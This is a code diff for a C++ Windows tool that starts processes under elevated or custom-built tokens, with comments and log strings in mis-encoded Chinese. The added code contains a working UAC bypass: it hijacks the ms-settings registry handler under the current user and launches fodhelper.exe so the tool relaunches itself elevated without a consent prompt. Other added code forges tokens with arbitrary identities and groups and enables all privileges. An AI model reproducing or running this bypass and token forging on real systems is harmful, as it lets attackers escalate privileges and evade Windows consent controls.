-        if (_stricmp(argv[i], "-i") == 0 || _stricmp(argv[i], "--inline") == 0) bInline = true;
-        else if (_stricmp(argv[i], "-S") == 0 || _stricmp(argv[i], "--System") == 0) bSystem = true;
-        else if (_stricmp(argv[i], "-TI") == 0 || _stricmp(argv[i], "--TrustedInstaller") == 0) bTI = true;
-        else if (_stricmp(argv[i], "-P") == 0 || _stricmp(argv[i], "--Privileged") == 0) bPriv = true;
-        else if (_stricmp(argv[i], "-D") == 0 || _stricmp(argv[i], "--debug") == 0) g_bDebug = true;
-        else if (argv[i][0] == '-') { Log(LOG_ERROR, "Êú™Áü•ÂèÇÊï∞Ôºö%s", argv[i]); return 0; }
-        else { argStart = i; break; }
-    }
+    // ≤Œ ˝Ω‚Œˆ
+    int parseStart = 1;
     
-    if(bInline)SetConsoleCtrlHandler(NULL, TRUE);
+    if (argc > 2 && strcmp(argv[1], "-pid") == 0) {
+        ParentProcessId = atoi(argv[2]);
+        parseStart = 4;
+        if (argc > 3 && strcmp(argv[3], "-E") == 0) {
+            bCleanRegistry = true;
+            parseStart = 5;
+        }
+    }
 
+    for (int i = parseStart; i < argc; i++) {
+        if (_stricmp(argv[i], "-i") == 0 || _stricmp(argv[i], "--inline") == 0) {
+            bInline = true;
+        }
+        else if (_stricmp(argv[i], "-p") == 0 || _stricmp(argv[i], "--Privileged") == 0) {
+            bPriv = true;
+        }
+        else if (_stricmp(argv[i], "-D") == 0 || _stricmp(argv[i], "--debug") == 0) {
+            g_bDebug = true;
+        }
+        else if (_stricmp(argv[i], "-B") == 0 || _stricmp(argv[i], "--Bypass") == 0) {
+            bBypass = true;
+        }
+        else if (_strnicmp(argv[i], "-U:", 3) == 0) {
+            std::string val = std::string(argv[i]).substr(3);
+            if (val.empty()) { Log(LOG_ERROR, "-U –Ë“™÷∏∂®…Ì∑›"); return 1; }
+            identityStr = val;
+        }
+        else if (_strnicmp(argv[i], "-G:", 3) == 0) {
+            std::string val = std::string(argv[i]).substr(3);
+            if (val.empty()) { Log(LOG_ERROR, "-G –Ë“™÷µ"); return 1; }
+            extraGroups.push_back(val);
+        }
+        else if (argv[i][0] == '-') {
+            Log(LOG_ERROR, "Œ¥÷™—°œÓ: %s", argv[i]);
+            return 1;
+        }
+        else {
+            argStart = i;
+            break;
+        }
+    }
+
+    // °Ô –ﬁ∏¥2£∫ππΩ®√¸¡Ó–– - ÷±Ω”∆¥Ω”‘≠ º≤Œ ˝£¨±£¡Ù“˝∫≈
     std::string cmdLine;
-    if (argStart < argc) { for (int i = argStart; i < argc; i++) { cmdLine += argv[i]; if (i < argc - 1) cmdLine += " "; } }
-    else Log(LOG_ERROR, "Êâæ‰∏çÂà∞Ë¶ÅËøêË°åÁöÑÂèÇÊï∞");
+    if (argStart < argc) {
+        for(int i = argStart; i < argc; i++) {
+            if(strlen(argv[i]) == 0 || strchr(argv[i], ' ') != NULL || strchr(argv[i], '\"') != NULL || strchr(argv[i], '\\') != NULL){
+                cmdLine.push_back('\"');
+                for(int j = 0; j < strlen(argv[i]); j++) {
+                    if(argv[i][j] == '\"' || argv[i][j] == '\\')cmdLine.push_back('\\');
+                    cmdLine.push_back(argv[i][j]);
+                }
+                cmdLine.push_back('\"');
+                cmdLine.push_back(' ');
+            } else {
+                cmdLine += argv[i];
+                cmdLine.push_back(' ');
+            }
+        }
+        cmdLine.pop_back();
+    } else {
+        cmdLine = "cmd.exe";
+    }
 
-    // -----------------------------------------------------
-    // STAGE 1 & 2: ÁÆ°ÁêÜÂëò/System ÊâßË°åÈÄªËæë
-    // -----------------------------------------------------
+    if (bInline) {
+        SetConsoleCtrlHandler(NULL, TRUE);
+    }
+
     if (IsUserAnAdmin()) {
-        // 1. ÂÜÖËÅîÊåÇËΩΩ (Â¶ÇÊûúÈúÄË¶Å)
-        if (bInline) {
+        // ==========================================
+        // “— «π‹¿Ì‘±£¨÷¥––∫À–ƒ¬ﬂº≠
+        // ==========================================
+        
+        // «Â¿Ì◊¢≤·±Ì (bypass ƒ£ Ω¡Ùœ¬µƒ)
+        if (bCleanRegistry) {
+            RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
+            Log(LOG_DEBUG, "“—«Â¿Ì bypass ◊¢≤·±ÌœÓ");
+        }
+
+        // °Ô –ﬁ∏¥1£∫Œﬁ¬€ «∑Ò inline£¨∂º≥¢ ‘ AttachConsole£®”√”⁄œ‘ æµ˜ ‘–≈œ¢£©
+        if (ParentProcessId > 0) {
             FreeConsole();
-            if (AttachConsole(ATTACH_PARENT_PROCESS)) {
-                Log(LOG_INFO, "Â∑≤ÊåÇËΩΩÂà∞Áà∂ÊéßÂà∂Âè∞");
+            if (!AttachConsole((DWORD)ParentProcessId)) {
+                Log(LOG_DEBUG, "Œﬁ∑®¡¨Ω”∏∏øÿ÷∆Ã®: %d", GetLastError());
+                AllocConsole();
             } else {
-                AllocConsole(); 
-                Log(LOG_WARN, "ÊåÇËΩΩÂ§±Ë¥•ÔºåÂàõÂª∫Êñ∞Á™óÂè£");
+                Log(LOG_DEBUG, "“—¡¨Ω”µΩ∏∏øÿ÷∆Ã® (PID: %d)", ParentProcessId);
             }
+        } else if (ParentProcessId < 0) {
+            // bypass ∑« inline ƒ£ Ω£∫ParentProcessId = -1
+            FreeConsole();
+            AllocConsole();
+            Log(LOG_DEBUG, "Bypass ƒ£ Ω£¨¥¥Ω®–¬øÿ÷∆Ã®");
         }
+        // ParentProcessId == 0  ±±£≥÷µ±«∞øÿ÷∆Ã®
 
-        if(!EnableCurrentProcessDebugPrivilege()) {
-            Log(LOG_WARN, "ÂêØÂä®Ë∞ÉËØïÁ®ãÂ∫èÁâπÊùÉÂ§±Ë¥•");
-        }
-        
         DWORD sess = GetActiveSessionID();
+        Log(LOG_DEBUG, "Session: %d, Inline: %s, ParentPID: %d", sess, bInline ? "true" : "false", ParentProcessId);
 
-        // [Ê†∏ÂøÉ‰∏≠ËΩ¨ÈÄªËæë]
-        // Â¶ÇÊûúÊàë‰ª¨ÁõÆÂâçÂè™ÊòØ AdminÔºå
-        // Êàë‰ª¨Âõ†‰∏∫Áº∫ÁâπÊùÉÊó†Ê≥ïÁõ¥Êé•ÂêØÂä® TIÔºå
-        // ÈÇ£‰πàÊàë‰ª¨ÂÖàÂêØÂä®‰∏Ä‰∏™ System ÊùÉÈôêÁöÑËá™Â∑±Ôºå
-        // ËÆ©ÈÇ£‰∏™ System ËøõÁ®ãÂéªÂêØÂä®ÊúÄÁªàÁöÑ TI ËøõÁ®ã„ÄÇ
-        if (bTI && !IsUserLocalSystem()) {
-            Log(LOG_INFO, "Ê≠£Âú®ËØ∑Ê±Ç System ‰∏≠ËΩ¨‰ª•Ëé∑Âèñ TI ÊùÉÈôê...");
-            
-            HANDLE hSysToken = GetSystemToken(sess);
-            if (!hSysToken) { Log(LOG_ERROR, "System ‰ª§ÁâåËé∑ÂèñÂ§±Ë¥•"); return 1; }
-
-            STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 };
-            si.dwFlags = 0; // ÁªßÊâøÊéßÂà∂Âè∞
-            si.lpDesktop = (LPSTR)"winsta0\\default";
-            
-            // ‰ª• System ÊùÉÈôêÂêØÂä®Ëá™Ë∫´
-            if (CreateProcessAsUserA(hSysToken, NULL, GetCommandLineA(), 
-                NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-                // Á≠âÂæÖ‰∏≠ËΩ¨ËøõÁ®ãÁªìÊùü
-                WaitForSingleObject(pi.hProcess, INFINITE);
-                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-                return 0; // ‰ªªÂä°ÂÆåÊàê
-            } else {
-                Log(LOG_ERROR, "System ‰∏≠ËΩ¨ÂêØÂä®Â§±Ë¥•: %lu", GetLastError());
-                return 1;
-            }
+        PSID pTargetSid = ResolveIdentity(identityStr.c_str());
+        if (!pTargetSid) {
+            Log(LOG_ERROR, "Œﬁ∑®Ω‚Œˆ…Ì∑›: %s", identityStr.c_str());
+            TerminateParent(ParentProcessId, 1);
+            return 1;
         }
 
-        // [Â∏∏ËßÑÂêØÂä®ÈÄªËæë]
-        // Ê≠§Êó∂Êàë‰ª¨Ë¶Å‰πàÊòØ Admin ÂêØÂä® Admin/SystemÔºå
-        // Ë¶Å‰πàÂ∑≤ÁªèÊòØ System ÂêØÂä® TI (‰∏≠ËΩ¨ÂêéÁöÑËá™Â∑±)
-        HANDLE hTargetToken = NULL;
-        
-        if (bTI) {
-            // Ê≠§Êó∂Êàë‰ª¨Â∫îËØ•ÊòØ System ‰∫Ü
-            hTargetToken = GetTrustedInstallerToken(sess);
-        } else if (bSystem) {
-            hTargetToken = GetSystemToken(sess);
-        } else {
-            // CurrentUser
-            HANDLE hP; 
-            OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hP);
-            DuplicateTokenEx(hP, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hTargetToken);
-            CloseHandle(hP);
+        HANDLE hToken = CreateCustomToken(sess, pTargetSid, extraGroups);
+        if (!hToken) {
+            Log(LOG_ERROR, "¡Ó≈∆¥¥Ω® ß∞‹");
+            TerminateParent(ParentProcessId, 1);
+            return 1;
         }
 
-        if (!hTargetToken) { Log(LOG_ERROR, "ÁõÆÊ†á‰ª§ÁâåËé∑ÂèñÂ§±Ë¥•"); return 1; }
+        if (bPriv) {
+            EnableAllPrivileges(hToken);
+            Log(LOG_INFO, "“—∆Ù”√À˘”–Ãÿ»® (-P)");
+        }
 
-        // ‰øÆÊ≠£ Session
-        DWORD ts; DWORD rl; GetTokenInformation(hTargetToken, TokenSessionId, &ts, sizeof(DWORD), &rl);
-        if (ts != sess) SetTokenInformation(hTargetToken, TokenSessionId, &sess, sizeof(DWORD));
-        
-        if (bPriv) EnablePrivileges(hTargetToken);
+        LPVOID lpEnv = NULL;
+        CreateEnvironmentBlock(&lpEnv, hToken, FALSE);
 
-        LPVOID lpEnv = NULL; CreateEnvironmentBlock(&lpEnv, hTargetToken, FALSE);
-        STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 };
+        STARTUPINFOA si = { sizeof(si) };
         si.lpDesktop = (LPSTR)"winsta0\\default";
         
         DWORD dwFlags = CREATE_UNICODE_ENVIRONMENT;
-        if (!bInline) dwFlags |= CREATE_NEW_CONSOLE;
-
-        Log(LOG_INFO, "ÂêØÂä®ÊúÄÁªàËøõÁ®ã: %s", cmdLine.c_str());
-
-        if (CreateProcessAsUserA(hTargetToken, NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, FALSE, dwFlags, lpEnv, NULL, &si, &pi)) {
-            if (bInline) WaitForSingleObject(pi.hProcess, INFINITE);
-            else Log(LOG_SUCCESS, "Êñ∞Á™óÂè£ PID: %lu", pi.dwProcessId);
-            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-        } else {
-            Log(LOG_ERROR, "ÂêØÂä®Â§±Ë¥•: %lu", GetLastError());
+        
+        // inline ƒ£ Ω£∫≤ª¥¥Ω®–¬øÿ÷∆Ã®£¨ºÃ≥–µ±«∞
+        // ∑« inline ƒ£ Ω£∫¥¥Ω®–¬øÿ÷∆Ã®
+        if (!bInline) {
+            dwFlags |= CREATE_NEW_CONSOLE;
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_SHOWNORMAL;
         }
 
-        if (lpEnv) DestroyEnvironmentBlock(lpEnv);
-        CloseHandle(hTargetToken);
-    }
+        PROCESS_INFORMATION pi = { 0 };
 
-    // -----------------------------------------------------
-    // STAGE 0: ÊôÆÈÄöÁî®Êà∑ÊèêÊùÉ
-    // -----------------------------------------------------
-    else {
-        char selfPath[MAX_PATH]; GetModuleFileNameA(NULL, selfPath, MAX_PATH);
-        std::string args = "-e "; args += GetCommandLineA();
+        Log(LOG_INFO, "∆Ù∂Ø: %s", cmdLine.c_str());
+        Log(LOG_DEBUG, "Flags: 0x%X, Inherit: %s", dwFlags, bInline ? "TRUE" : "FALSE");
+
+        BOOL success = CreateProcessAsUserA(
+            hToken, 
+            NULL, 
+            (LPSTR)cmdLine.c_str(), 
+            NULL, 
+            NULL,
+            bInline ? TRUE : FALSE,
+            dwFlags, 
+            lpEnv, 
+            NULL, 
+            &si, 
+            &pi
+        );
+
+        if (success) {
+            Log(LOG_SUCCESS, "Ω¯≥Ã“—∆Ù∂Ø, PID: %lu", pi.dwProcessId);
+            
+            if (bInline) {
+                WaitForSingleObject(pi.hProcess, INFINITE);
+                DWORD exitCode = 0;
+                GetExitCodeProcess(pi.hProcess, &exitCode);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                if (lpEnv) DestroyEnvironmentBlock(lpEnv);
+                CloseHandle(hToken);
+                TerminateParent(ParentProcessId, exitCode);
+                ExitProcess(exitCode);
+            } else {
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                if (lpEnv) DestroyEnvironmentBlock(lpEnv);
+                CloseHandle(hToken);
+                TerminateParent(ParentProcessId, 0);
+                ExitProcess(0);
+            }
+        } else {
+            DWORD err = GetLastError();
+            Log(LOG_ERROR, "Ω¯≥Ã¥¥Ω® ß∞‹: %lu", err);
+            if (lpEnv) DestroyEnvironmentBlock(lpEnv);
+            CloseHandle(hToken);
+            TerminateParent(ParentProcessId, 1);
+            return 1;
+        }
+
+    } else if (bBypass) {
+        // ==========================================
+        // UAC Bypass ƒ£ Ω
+        // ==========================================
+        char selfPath[MAX_PATH];
+        char cmdline[32768];
+        
+        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+        
+        sprintf(cmdline, "\"%s\" -pid %lu -E %s", selfPath, GetCurrentProcessId(), GetCommandLineA());
+        
+        RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
+        
+        HKEY hKey;
+        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command",
+                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)cmdline, strlen(cmdline) + 1);
+        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
+        RegCloseKey(hKey);
+        
+        Log(LOG_DEBUG, "Bypass √¸¡Ó: %s", cmdline);
+        
         SHELLEXECUTEINFOA sei = { sizeof(sei) };
-        sei.lpVerb = "runas"; sei.lpFile = selfPath; sei.lpParameters = args.c_str();
-        sei.nShow = SW_HIDE; 
-        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-        Log(LOG_INFO, "Ê≠£Âú®ËØ∑Ê±ÇÊèêÊùÉ...");
+        sei.lpFile = "fodhelper.exe";
+        sei.nShow = SW_HIDE;
+        
+        Log(LOG_INFO, "UAC Bypass...");
         if (ShellExecuteExA(&sei)) {
-            if (bInline) WaitForSingleObject(sei.hProcess, INFINITE);
-            CloseHandle(sei.hProcess);
-            Log(LOG_SUCCESS, "ÊèêÊùÉÊàêÂäü");
+            Sleep(INFINITE);
         } else {
-            Log(LOG_ERROR, "ÊèêÊùÉÂ§±Ë¥•");
+            Log(LOG_ERROR, "Bypass  ß∞‹: %lu", GetLastError());
+            RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
+            return 1;
+        }
+
+    } else {
+        // ==========================================
+        // ∆’Õ® UAC Ã·»®
+        // ==========================================
+        char selfPath[MAX_PATH];
+        char params[32768];
+        
+        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+        
+        // °Ô –ﬁ∏¥3£∫ π”√”√ªßµƒÃ·»®¬ﬂº≠
+        sprintf(params, "-pid %lu %s", GetCurrentProcessId(), GetCommandLineA());
+        
+        Log(LOG_DEBUG, "Ã·»®≤Œ ˝: %s", params);
+        
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.lpVerb = "runas";
+        sei.lpFile = selfPath;
+        sei.lpParameters = params;
+        sei.nShow = SW_HIDE;
+        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+        
+        Log(LOG_INFO, "«Î«Ûπ‹¿Ì‘±»®œﬁ...");
+        if (ShellExecuteExA(&sei)) {
+            if (sei.hProcess) CloseHandle(sei.hProcess);
+            Sleep(INFINITE);
+        } else {
+            Log(LOG_ERROR, "Ã·»® ß∞‹: %lu", GetLastError());
+            return 1;
         }
     }
-    
+
     return 0;
 }
